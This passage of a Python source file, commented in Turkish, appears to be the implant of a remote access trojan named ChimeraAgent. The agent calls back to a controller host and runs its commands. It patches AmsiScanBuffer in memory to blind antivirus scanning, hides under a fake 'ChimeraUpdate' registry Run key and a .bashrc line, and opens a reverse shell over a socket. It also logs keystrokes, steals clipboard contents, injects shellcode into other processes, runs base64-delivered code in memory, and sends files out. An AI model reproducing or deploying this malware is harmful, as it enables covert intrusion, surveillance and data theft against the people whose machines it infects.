                return "[!] Screenshot alınamadı. Gerekli araçlar: mss, Pillow, scrot veya ImageMagick"
            except Exception as e:
                return f"[!] Screenshot hatası (Linux): {str(e)}"
        
        return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."

    # --------------------------------------------------------
    # Evasion (Atlatma) Teknikleri
    # --------------------------------------------------------
    def bypass_amsi(self) -> str:
        """AMSI (Antimalware Scan Interface) korumasını devre dışı bırakır (Windows).
        
        Bellekteki amsi.dll içerisindeki AmsiScanBuffer fonksiyonunun başlangıcını
        patchleyerek her zaman temiz sonuç dönmesini sağlar.
        
        Returns:
            str: İşlem sonucu
        """
        if sys.platform != "win32":
            return "[!] AMSI Bypass sadece Windows sistemlerde geçerlidir."
            
        try:
            import ctypes
            from ctypes import wintypes
            
            kernel32 = ctypes.windll.kernel32
            
            # Gerekli DLL'i yükle (Zaten yüklü olabilir ama garanti olsun)
            # LoadLibraryA yerine LoadLibraryW unicode için daha güvenli
            h_amsi = kernel32.LoadLibraryW("amsi.dll")
            if not h_amsi:
                return "[!] amsi.dll yüklenemedi (Sistemde AMSI olmayabilir)."
                
            # AmsiScanBuffer adresini bul
            get_proc_address = kernel32.GetProcAddress
            get_proc_address.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
            get_proc_address.restype = ctypes.c_void_p
            
            # Obfuscation: Fonksiyon adını parça parça birleştir (String taramasından kaçmak için)
            func_name = b"Amsi" + b"Scan" + b"Buffer"
            amsi_scan_buffer_addr = get_proc_address(h_amsi, func_name)
            
            if not amsi_scan_buffer_addr:
                return "[!] AmsiScanBuffer adresi bulunamadı."
                
            # Mimariye uygun patch hazırla
            if struct.calcsize("P") * 8 == 64:
                # x64 Patch
                # mov eax, 0x80070057 (E_INVALIDARG)
                # ret
                patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC3"
            else:
                # x86 Patch
                # mov eax, 0x80070057
                # ret 0x18 (Argümanları temizle - Stdcall)
                patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC2\\x18\\x00"
                
            # Bellek korumasını değiştir (RWX yap)
            # PAGE_EXECUTE_READWRITE = 0x40
            old_protect = ctypes.c_ulong()
            
            # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
            if not kernel32.VirtualProtect(
                ctypes.c_void_p(amsi_scan_buffer_addr), 
                len(patch), 
                0x40, 
                ctypes.byref(old_protect)
            ):
                return f"[!] Bellek izni değiştirilemedi. Hata Kodu: {kernel32.GetLastError()}"
            
            # Patch'i uygula (memmove veya pointer ile yazma)
            # ctypes.memmove daha güvenilir
            ctypes.memmove(ctypes.c_void_p(amsi_scan_buffer_addr), patch, len(patch))
            
            # Bellek korumasını eski haline getir
            kernel32.VirtualProtect(
                ctypes.c_void_p(amsi_scan_buffer_addr), 
                len(patch), 
                old_protect, 
                ctypes.byref(old_protect)
            )
            
            return f"[+] AMSI Bypass başarıyla uygulandı! (Adres: {hex(amsi_scan_buffer_addr)})"
            
        except Exception as e:
            return f"[!] AMSI Bypass hatası: {str(e)}"

    # --------------------------------------------------------
    # Persistence (Kalıcılık) Teknikleri
    # --------------------------------------------------------
    def install_persistence(self) -> str:
        """Ajanı sistem başlangıcında çalışacak şekilde ayarlar.
        
        Windows: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        Linux: .bashrc veya crontab
        
        Returns:
            str: İşlem sonucu
        """
        try:
            # Mevcut dosya yolunu al
            current_exe = os.path.abspath(sys.argv[0])
            
            if sys.platform == "win32":
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    
                    # Registry anahtarını aç
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                        winreg.SetValueEx(reg_key, "ChimeraUpdate", 0, winreg.REG_SZ, current_exe)
                        
                    return f"[+] Kalıcılık eklendi (Registry Run Key): {current_exe}"
                except Exception as e:
                    return f"[!] Registry hatası: {str(e)}"
                    
            else:
                # Linux/Unix Persistence
                try:
                    # Yöntem 1: .bashrc (Kullanıcı login olduğunda çalışır)
                    bashrc_path = os.path.expanduser("~/.bashrc")
                    if os.path.exists(bashrc_path):
                        # Zaten ekli mi kontrol et
                        with open(bashrc_path, "r") as f:
                            if "ChimeraAgent" in f.read():
                                return "[!] Kalıcılık zaten .bashrc dosyasında mevcut."
                        
                        # Arka planda çalışacak şekilde ekle
                        # (nohup ... &)
                        cmd = f"\n# ChimeraAgent Persistence\nnohup python3 {current_exe} >/dev/null 2>&1 &\n"
                        
                        with open(bashrc_path, "a") as f:
                            f.write(cmd)
                            
                        return f"[+] Kalıcılık eklendi (.bashrc): {current_exe}"
                    else:
                        # Yöntem 2: Crontab (Eğer .bashrc yoksa)
                        # Not: Crontab manipülasyonu biraz daha karmaşık olabilir, şimdilik .bashrc yeterli.
                        return "[!] .bashrc bulunamadı, kalıcılık eklenemedi."
                        
                except Exception as e:
                    return f"[!] Linux Persistence hatası: {str(e)}"
                    
        except Exception as e:
            return f"[!] Kalıcılık hatası: {str(e)}"

    def remove_persistence(self) -> str:
        """Kalıcılık ayarlarını temizler."""
        try:
            if sys.platform == "win32":
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                        winreg.DeleteValue(reg_key, "ChimeraUpdate")
                        
                    return "[+] Kalıcılık kaldırıldı (Registry temizlendi)."
                except FileNotFoundError:
                    return "[!] Kalıcılık zaten yok veya bulunamadı."
                except Exception as e:
                    return f"[!] Registry temizleme hatası: {str(e)}"
            else:
                try:
                    bashrc_path = os.path.expanduser("~/.bashrc")
                    if os.path.exists(bashrc_path):
                        with open(bashrc_path, "r") as f:
                            lines = f.readlines()
                        
                        # ChimeraAgent içeren satırları filtrele
                        new_lines = []
                        removed = False
                        skip = False
                        
                        for line in lines:
                            if "# ChimeraAgent Persistence" in line:
                                skip = True
                                removed = True
                                continue
                            if skip and "ChimeraAgent" in line: # Payload satırı
                                continue
                            if skip and line.strip() == "": # Sonraki boş satır
                                skip = False
                                continue
                            if not skip:
                                new_lines.append(line)
                                
                        if removed:
                            with open(bashrc_path, "w") as f:
                                f.writelines(new_lines)
                            return "[+] Kalıcılık kaldırıldı (.bashrc temizlendi)."
                        else:
                            return "[!] .bashrc içinde kalıcılık izi bulunamadı."
                    else:
                        return "[!] .bashrc dosyası bulunamadı."
                except Exception as e:
                    return f"[!] Linux temizleme hatası: {str(e)}"
        except Exception as e:
            return f"[!] Kalıcılık kaldırma hatası: {str(e)}"

    # --------------------------------------------------------
    # Komut Çalıştırma
    # --------------------------------------------------------
    def shell_mode(self):
        """Etkileşimli shell modunu başlatır (Raw Socket)."""
        # Shell komutunu belirle
        if sys.platform == "win32":
            shell_cmd = "cmd.exe"
        else:
            shell_cmd = "/bin/bash -i" if os.path.exists("/bin/bash") else "/bin/sh -i"
            
        try:
            # PTY desteği olmadığı için pipe kullanıyoruz.
            # stderr=subprocess.STDOUT ile hataları da aynı kanaldan alıyoruz.
            process = subprocess.Popen(
                shell_cmd,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0  # Unbuffered I/O
            )
        except Exception as e:
            self.send_data(f"[!] Shell başlatılamadı: {e}")
            return

        # Kullanıcıya shell'in başladığını bildir (HTTP üzerinden son mesaj)
        self.send_data("[+] Shell oturumu başlatıldı. (Çıkmak için 'exit' yazın)")
        
        # Kısa bir bekleme, handler'ın moda geçmesi için
        time.sleep(1)

        # ----------------------------------------------------
        # RAW SOCKET MODU (Direct Stream)
        # ----------------------------------------------------
        stop_event = threading.Event()

        def sock_to_proc():
            """Socket -> Process STDIN"""
            while not stop_event.is_set():
                try:
                    data = self.sock.recv(1024)
                    if not data:
                        stop_event.set()
                        break
                    
                    # Çıkış kontrolü
                    if b"exit_shell_mode_now" in data:
                        stop_event.set()
                        break
                        
                    process.stdin.write(data)
                    process.stdin.flush()
                except Exception:
                    stop_event.set()
                    break

        def proc_to_sock():
            """Process STDOUT -> Socket"""
            while not stop_event.is_set():
                try:
                    # Tek byte okuma (Non-blocking gibi davranması için)
                    byte = process.stdout.read(1)
                    if not byte:
                        stop_event.set()
                        break
                    self.sock.send(byte)
                except Exception:
                    stop_event.set()
                    break

        # Thread'leri başlat
        t1 = threading.Thread(target=sock_to_proc, daemon=True)
        t2 = threading.Thread(target=proc_to_sock, daemon=True)
        
        t1.start()
        t2.start()
        
        # Biri durana kadar bekle
        while not stop_event.is_set():
            time.sleep(0.1)
            if not t1.is_alive() or not t2.is_alive():
                stop_event.set()
        
        # Temizlik
        try: process.terminate()
        except: pass
        
        # Bağlantıyı kapat (Handler da kapatacak, reconnect ile temiz başlangıç yapılacak)
        self.close_socket()

    def execute_command(self, cmd: str) -> str:
        """Sistem komutu çalıştırır.
        
        Args:
            cmd: Çalıştırılacak komut.
            
        Returns:
            str: Komut çıktısı.
        """
        cmd_lower = cmd.strip().lower()

        # Özel komutlar
        if cmd_lower == "terminate":
            self.running = False
            return "Agent sonlandırılıyor..."
        
        # Sistem bilgisi komutu
        if cmd_lower == "sysinfo":
            return self.get_detailed_sysinfo()
        
        # Ortam analizi komutu (AV/EDR ve VM tespiti)
        if cmd_lower == "detect":
            return self.detect_environment()
        
        # Ekran görüntüsü komutu (RAM üzerinden capture & transfer)
        if cmd_lower == "screenshot":
            return self.take_screenshot()

        # Keylogger Komutları
        if cmd_lower == "keylogger_start":
            if sys.platform != "win32":
                return "[!] Keylogger şu an sadece Windows sistemlerde desteklenmektedir."
            
            if self.keylogger.start():
                return "[+] Keylogger başlatıldı (Arka planda çalışıyor)."
            else:
                return "[!] Keylogger zaten çalışıyor veya başlatılamadı."

        if cmd_lower == "keylogger_stop":
            if self.keylogger.stop():
                return "[+] Keylogger durduruldu."
            else:
                return "[!] Keylogger çalışmıyor."

        if cmd_lower == "keylogger_dump":
            logs = self.keylogger.dump()
            if not logs:
                return "KEYLOGGER_EMPTY"
            
            # Logları Base64 encode et (Transfer güvenliği için)
            b64_logs = base64.b64encode(logs.encode('utf-8')).decode('utf-8')
            return f"KEYLOG_DUMP:{b64_logs}"

        # Clipboard Komutları
        if cmd_lower == "clipboard_get":
            content = self.clipboard.get_text()
            if not content:
                content = "[Pano Boş]"
            
            # İçeriği güvenli transfer için base64 ile kodla
            # (Özel karakterler veya newlinelar protokolü bozmasın diye)
            b64_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
            return f"CLIPBOARD_DATA:{b64_content}"
            
        if cmd_lower == "amsi_bypass":
            return self.bypass_amsi()

        # Persistence (Kalıcılık) Komutları
        if cmd_lower == "persistence_install":
            return self.install_persistence()

        if cmd_lower == "persistence_remove":
            return self.remove_persistence()

        # ── Process Injection / Migration ──────────────────────

        # inject_list: Enjeksiyona uygun process'leri göster
        if cmd_lower == "inject_list":
            return self.injector.list_injectable_processes()

        # inject_shellcode <PID> <HEX_SHELLCODE>
        #   Shellcode'u hex string olarak alır ve hedef PID'e enjekte eder.
        #   Örnek: inject_shellcode 1234 fc4883e4f0...
        if cmd_lower.startswith("inject_shellcode "):
            try:
                parts = cmd.strip().split(None, 2)
                if len(parts) < 3:
                    return "[!] Kullanım: inject_shellcode <PID> <HEX_SHELLCODE>"

                target_pid = int(parts[1])
                hex_sc     = parts[2].strip()

                # Hex string'i bytes'a çevir (boşluk/\x prefix toleranslı)
                hex_sc_clean = hex_sc.replace(" ", "").replace("\\x", "").replace("0x", "")
                shellcode = bytes.fromhex(hex_sc_clean)

                # NtCreateThreadEx kullanılsın mı? (prefix: nt:)
                use_nt = False
                if parts[2].strip().startswith("nt:"):
                    use_nt = True
                    hex_sc_clean = parts[2][3:].strip().replace(" ", "").replace("\\x", "").replace("0x", "")
                    shellcode = bytes.fromhex(hex_sc_clean)

                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)

            except ValueError as e:
                return f"[!] Geçersiz PID veya shellcode formatı: {str(e)}"
            except Exception as e:
                return f"[!] inject_shellcode hatası: {str(e)}"

        # inject_shellcode_b64 <PID> <B64_SHELLCODE>
        #   Base64 encoded shellcode ile enjeksiyon (handler tarafından kullanılır).
        if cmd_lower.startswith("inject_shellcode_b64 "):
            try:
                parts = cmd.strip().split(None, 2)
                if len(parts) < 3:
                    return "[!] Kullanım: inject_shellcode_b64 <PID> <BASE64_SHELLCODE>"

                target_pid = int(parts[1])
                use_nt     = False
                b64_raw    = parts[2].strip()

                if b64_raw.startswith("nt:"):
                    use_nt  = True
                    b64_raw = b64_raw[3:]

                shellcode = base64.b64decode(b64_raw)
                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)

            except Exception as e:
                return f"[!] inject_shellcode_b64 hatası: {str(e)}"

        # inject_migrate <PID>  &  inject_migrate <PID> <B64_SHELLCODE>
        #   Migration: varsa shellcode ile, yoksa bilgi verir.
        if cmd_lower.startswith("inject_migrate"):
            try:
                parts = cmd.strip().split(None, 2)
                if len(parts) < 2:
                    return "[!] Kullanım: inject_migrate <PID> [B64_SHELLCODE]"

                target_pid = int(parts[1])

                if len(parts) == 3:
                    # B64 shellcode verildi → geçici dosyaya yaz, migrate et, sil
                    shellcode = base64.b64decode(parts[2].strip())
                    tmp_sc_path = os.path.join(
                        __import__("tempfile").gettempdir(),
                        f".mig_{os.getpid()}_{target_pid}.bin"
                    )
                    try:
                        with open(tmp_sc_path, "wb") as _f:
                            _f.write(shellcode)
                        result = self.injector.migrate(target_pid, tmp_sc_path)
                    finally:
                        try:
                            os.remove(tmp_sc_path)
                        except Exception:
                            pass
                    return result
                else:
                    return self.injector.migrate(target_pid)

            except ValueError as e:
                return f"[!] Geçersiz PID: {str(e)}"
            except Exception as e:
                return f"[!] inject_migrate hatası: {str(e)}"

        if cmd_lower.startswith("clipboard_set "):
            try:
                # Komuttan metni ayır (clipboard_set <text>)
                text_to_set = cmd[14:].strip() # "clipboard_set " uzunluğu 14
                
                # Eğer base64 olarak gönderilmişse decode et (opsiyonel, şimdilik raw text)
                # Ancak kullanıcı direkt "clipboard_set hello world" yazarsa raw metindir.
                
                if self.clipboard.set_text(text_to_set):
                    return f"[+] Pano içeriği değiştirildi: '{text_to_set[:20]}...'"
                else:
                    return "[!] Pano içeriği değiştirilemedi."
            except Exception as e:
                return f"[!] Pano yazma hatası: {str(e)}"

        # ── Port Forwarding ────────────────────────────
        if cmd_lower.startswith("portfwd "):
            try:
                pf_parts = cmd.strip().split()
                sub_cmd  = pf_parts[1].lower() if len(pf_parts) > 1 else ""

                if sub_cmd == "add":
                    # portfwd add -L <bind> -r <remote> -p <port>
                    bind_port = 0
                    remote_host = ""
                    remote_port = 0
                    bind_host = "127.0.0.1"
                    
                    for i, part in enumerate(pf_parts):
                        if part.lower() == "-l" and i + 1 < len(pf_parts):
                            bind_port = int(pf_parts[i+1])
                        elif part.lower() == "-r" and i + 1 < len(pf_parts):
                            remote_host = pf_parts[i+1]
                        elif part.lower() == "-p" and i + 1 < len(pf_parts):
                            remote_port = int(pf_parts[i+1])
                            
                    if not bind_port or not remote_host or not remote_port:
                        return "[!] Kullanım: portfwd add -L <bind_port> -r <remote_host> -p <remote_port>"
                        
                    return self.port_forwarder.add(bind_host, bind_port, remote_host, remote_port)

                elif sub_cmd == "del":
                    if len(pf_parts) < 3:
                        return "[!] Kullanım: portfwd del <id>"
                    tunnel_id = int(pf_parts[2])
                    return self.port_forwarder.remove(tunnel_id)

                elif sub_cmd == "list":
                    return self.port_forwarder.list_tunnels()

                elif sub_cmd == "stop":
                    return self.port_forwarder.stop_all()

                else:
                    return (
                        "[!] Geçersiz alt komut. Kullanım:\n"
                        "    portfwd add -L <bind_port> -r <remote_host> -p <remote_port>\n"
                        "    portfwd list\n"
                        "    portfwd del <id>\n"
                        "    portfwd stop"
                    )
            except ValueError as e:
                return f"[!] Geçersiz parametre formatı: {e}"
            except Exception as e:
                return f"[!] Port forwarding hatası: {e}"

        # ── Network Scanner ─────────────────────────────
        if cmd_lower.startswith("netscan "):
            try:
                ns_parts = cmd.strip().split()
                sub_cmd  = ns_parts[1].lower() if len(ns_parts) > 1 else ""

                if sub_cmd == "sweep":
                    # netscan sweep <CIDR> [timeout]
                    if len(ns_parts) < 3:
                        return "[!] Kullanım: netscan sweep <CIDR> [timeout]\n    Örnek: netscan sweep 192.168.1.0/24"
                    cidr = ns_parts[2]
                    timeout = int(ns_parts[3]) if len(ns_parts) > 3 else 1
                    return self.net_scanner.ping_sweep(cidr, timeout=timeout)

                elif sub_cmd == "arp":
                    # netscan arp [CIDR]
                    cidr = ns_parts[2] if len(ns_parts) > 2 else "0.0.0.0/0"
                    return self.net_scanner.arp_scan(cidr)

                elif sub_cmd == "ports":
                    # netscan ports <HOST> [port_aralığı] [timeout]
                    # Örnekler:
                    #   netscan ports 192.168.1.1
                    #   netscan ports 192.168.1.1 1-1024
                    #   netscan ports 192.168.1.1 22,80,443,3389
                    #   netscan ports 192.168.1.1 1-65535 0.3
                    if len(ns_parts) < 3:
                        return (
                            "[!] Kullanım: netscan ports <HOST> [port_aralığı] [timeout]\n"
                            "    Örnek: netscan ports 192.168.1.1\n"
                            "    Örnek: netscan ports 192.168.1.1 1-1024\n"
                            "    Örnek: netscan ports 192.168.1.1 22,80,443,3389"
                        )
                    host = ns_parts[2]
                    port_range = ns_parts[3] if len(ns_parts) > 3 else "1-1024"
                    timeout = float(ns_parts[4]) if len(ns_parts) > 4 else 0.5
                    return self.net_scanner.port_scan(host, port_range=port_range, timeout=timeout)

                else:
                    return (
                        "[!] Geçersiz alt komut. Kullanım:\n"
                        "    netscan sweep <CIDR> [timeout]       - Ping sweep (host keşfi)\n"
                        "    netscan arp [CIDR]                   - ARP tablosu taraması\n"
                        "    netscan ports <HOST> [aralık] [timeout] - TCP port taraması"
                    )
            except ValueError as e:
                return f"[!] Geçersiz parametre: {e}"
            except Exception as e:
                return f"[!] Network scan hatası: {e}"

        # Özel komutlar - Shell
        if cmd_lower == "shell":
            return self.shell_mode()
        
        # Modül Yönetimi - Hafızadan modül yükleme ve çalıştırma
        if cmd_lower.startswith("loadmodule "):
            try:
                # Format: loadmodule <name> <b64_code>
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    return "[!] Kullanım: loadmodule <name> <b64_code>"
                
                module_name = parts[1]
                b64_code = parts[2]
                
                # Base64 decode
                code = base64.b64decode(b64_code).decode("utf-8")
                
                # Yeni modül oluştur
                mod = types.ModuleType(module_name)
                
                # Kodu modül context'inde çalıştır
                exec(code, mod.__dict__)
                
                # Modülü sisteme kaydet
                sys.modules[module_name] = mod
                self.loaded_modules[module_name] = mod
                
                return f"[+] Modül '{module_name}' hafızaya yüklendi."
            except Exception as e:
                return f"[!] Modül yükleme hatası: {str(e)}"

        elif cmd.startswith("runmodule "):
            try:
                # Format: runmodule <name> [func] [args...]
                parts = cmd.strip().split(" ")
                if len(parts) < 2:
                    return "[!] Kullanım: runmodule <name> [func]"
                
                module_name = parts[1]
                func_name = parts[2] if len(parts) > 2 else "run"
                args = parts[3:]
                
                if module_name not in self.loaded_modules:
                    return f"[!] Hata: '{module_name}' modülü yüklü değil."
                
                mod = self.loaded_modules[module_name]
                
                if not hasattr(mod, func_name):
                    return f"[!] Hata: '{func_name}' fonksiyonu bulunamadı."
                
                # Fonksiyonu çalıştır
                func = getattr(mod, func_name)
                
                # Argümanları dinamik olarak ilet
                if args:
                    result = func(*args)
                else:
                    result = func()
                    
                return str(result) if result is not None else "[+] Fonksiyon çalıştırıldı (Dönüş değeri yok)."
            except Exception as e:
                return f"[!] Modül çalıştırma hatası: {str(e)}"

        elif cmd.strip() == "listmodules":
            if not self.loaded_modules:
                return "[-] Yüklü modül yok."
            return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])

        # Özel komutlar - Dizin Değiştirme (cd)
        if cmd_lower.startswith("cd "):
            try:
                target_dir = cmd.strip()[3:].strip()
                if not target_dir:
                    return f"[+] Mevcut dizin: {os.getcwd()}"
                os.chdir(target_dir)
                return f"[+] Dizin değiştirildi: {os.getcwd()}"
            except FileNotFoundError:
                return f"[!] Hata: Dizin bulunamadı: {target_dir}"
            except Exception as e:
                return f"[!] Hata: {str(e)}"
        
        # Özel komutlar - Mevcut Dizin (pwd)
        elif cmd_lower == "pwd":
            return os.getcwd()

        # Özel komutlar - Dizin Listeleme (ls)
        # Kullanım: ls veya ls <path>
        elif cmd_lower.startswith("ls"):
            try:
                target_dir = cmd.strip()[3:].strip()
                if not target_dir:
                    target_dir = os.getcwd()
                
                if not os.path.exists(target_dir):
                    return f"[!] Hata: Dizin bulunamadı: {target_dir}"
                
                entries = os.listdir(target_dir)
                output = f"Dizin Listesi: {target_dir}\n"
                output += "-" * 50 + "\n"
                
                # Dosya ve klasörleri ayrıştır
                dirs = []
                files = []
                for entry in entries:
                    full_path = os.path.join(target_dir, entry)
                    if os.path.isdir(full_path):
                        dirs.append(f"[DIR]  {entry}")
                    else:
                        size = os.path.getsize(full_path)
                        files.append(f"[FILE] {entry} ({size} bytes)")
                
                output += "\n".join(sorted(dirs) + sorted(files))
                return output
            except Exception as e:
                return f"[!] Listeleme hatası: {str(e)}"

        # Özel komutlar - Klasör Oluşturma (mkdir)
        elif cmd_lower.startswith("mkdir "):
            try:
                path = cmd.strip()[6:].strip()
                os.makedirs(path, exist_ok=True)
                return f"[+] Klasör oluşturuldu: {path}"
            except Exception as e:
                return f"[!] Oluşturma hatası: {str(e)}"

        # Özel komutlar - Dosya/Klasör Silme (rm)
        elif cmd_lower.startswith("rm "):
            try:
                path = cmd.strip()[3:].strip()
                if os.path.isdir(path):
                    import shutil
                    shutil.rmtree(path)
                    return f"[+] Klasör silindi: {path}"
                elif os.path.isfile(path):
                    os.remove(path)
                    return f"[+] Dosya silindi: {path}"
                else:
                    return f"[!] Bulunamadı: {path}"
            except Exception as e:
                return f"[!] Silme hatası: {str(e)}"

        # Özel komutlar - Dosya İndirme (download)
        # Kullanım: download <remote_path>
        elif cmd_lower.startswith("download "):
            try:
                file_path = cmd.strip()[9:].strip()
                if not os.path.exists(file_path):
                    return f"[!] Hata: Dosya bulunamadı: {file_path}"
                
                if os.path.isdir(file_path):
                    return f"[!] Hata: Bu bir klasör, dosya değil."

                with open(file_path, "rb") as f:
                    file_content = f.read()
                    b64_content = base64.b64encode(file_content).decode('utf-8')
                
                # Özel bir prefix ile gönderiyoruz ki handler bunu anlayıp dosyaya yazabilsin
                return f"DOWNLOAD_OK:{b64_content}"
            except Exception as e:
                return f"[!] İndirme hatası: {str(e)}"

        # Özel komutlar - Dosya Yükleme (upload)
        # Kullanım: upload <hedef_yol> <b64_data>
        # (Bu komut handler tarafından oluşturulur)
        elif cmd.startswith("upload "):
            try:
                # İlk boşluğa kadar komut, ikinci boşluğa kadar path, kalanı data
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    return "[!] Hata: upload <path> <b64_data>"
                
                target_path = parts[1]
                b64_data = parts[2]
                
                file_content = base64.b64decode(b64_data)
                
                with open(target_path, "wb") as f:
                    f.write(file_content)
                    
                return f"[+] Dosya başarıyla yüklendi: {target_path} ({len(file_content)} bytes)"
            except Exception as e:
                return f"[!] Yükleme hatası: {str(e)}"

        try:
            # Komutu gizli pencerede çalıştır
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE

            # stderr=subprocess.STDOUT ile hataları da çıktıya ekle
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, 
                stdin=subprocess.PIPE,
                startupinfo=startupinfo
            )
            stdout, _ = proc.communicate(timeout=30)
            
            # Windows için decoding (cp1254, utf-8 vs.)
            try:
                result = stdout.decode("cp1254") if sys.platform == "win32" else stdout.decode("utf-8")
            except:
                result = stdout.decode("utf-8", errors="ignore")
            
            if not result.strip():
                if proc.returncode == 0:
                    result = "[+] Komut başarıyla çalıştırıldı (Çıktı yok)."
                else:
                    result = f"[!] Komut hatayla bitti - çıkış kodu: {proc.returncode}"
            
            return result
        except subprocess.TimeoutExpired:
            proc.kill()
            return "[!] Komut zaman aşımına uğradı (30s)"
        except Exception as e:
            return f"[!] Komut Çalıştırma Hatası: {str(e)}"

    # --------------------------------------------------------
    # Ana Döngü
    # --------------------------------------------------------
    def run(self):
        """Ajanın ana çalışma döngüsü.
        
        1. Handler'a bağlan
        2. Sistem bilgisini gönder
        3. Komut al → çalıştır → sonuç gönder döngüsü
        4. Bağlantı koparsa yeniden bağlan
        """
        # İlk bağlantı
        if not self.connect():
            if not self.reconnect():
                return
        
        # Sistem bilgisini gönder
        self.send_sysinfo()

        # Ana komut döngüsü
        while self.running:
            try:
                # Komut bekle
                cmd = self.recv_data()
                if not cmd:
                    # Bağlantı kopmuş, yeniden bağlan
                    if not self.reconnect():
                        break
                    continue
                
                # Komutu çalıştır
                output = self.execute_command(cmd)
                
                # Sonucu gönder
                self.send_data(output)
                
            except Exception:
                # Herhangi bir hata durumunda yeniden bağlan
                if self.running:
                    if not self.reconnect():
                        break

        # Temiz çıkış
        self.close_socket()


# ============================================================
# Ana Giriş Noktası
# ============================================================
if __name__ == "__main__":
    try:
        agent = ChimeraAgent(LHOST, LPORT)
        agent.run()
    except Exception:
        pass
